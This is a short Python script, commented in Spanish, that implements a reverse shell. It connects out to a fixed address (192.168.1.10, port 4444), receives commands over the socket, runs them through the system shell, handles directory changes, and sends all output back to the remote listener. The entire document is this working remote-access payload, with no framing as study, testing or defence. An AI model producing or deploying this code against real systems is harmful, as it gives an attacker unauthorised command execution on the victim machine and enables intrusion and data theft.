import socket
import subprocess
import os

# Configuración del servidor al que conectar
HOST = '192.168.1.10'  # IP del servidor
PORT = 4444            # Puerto del servidor

# Crear socket y conectar al servidor
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Ciclo para recibir comandos del servidor y ejecutarlos
while True:
    # Recibir comando
    cmd = s.recv(1024).decode()

    # Ejecutar el comando y capturar la salida
    if cmd.lower() == 'exit':
        break
    if cmd.startswith('cd'):
        try:
            os.chdir(cmd[3:].strip())
            s.send(b'Changed directory')
        except Exception as e:
            s.send(str(e).encode())
    else:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        s.send(stdout_value)

# Cerrar conexión
s.close()
